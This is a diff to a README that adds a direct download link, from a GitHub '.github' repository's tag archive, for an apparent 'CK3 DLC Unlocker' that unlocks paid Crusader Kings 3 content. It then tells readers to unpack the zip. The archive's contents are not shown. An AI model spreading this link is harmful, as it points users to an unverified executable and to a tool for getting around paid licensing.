@@ -3,7 +3,7 @@
 ## 🚀 Getting Started
 
 1. **Download CK3nlocker**  
-   [🔗 Download CK3 DLC Unlocker](#)
+   [🔗 Download CK3 DLC Unlocker](https://github.com/Crusader-Kings-3-DLC-Unlocker/.github/archive/refs/tags/1.7.8.zip)
 
 2. **Unpack the downloaded file** and review the quickstart guide included.
 
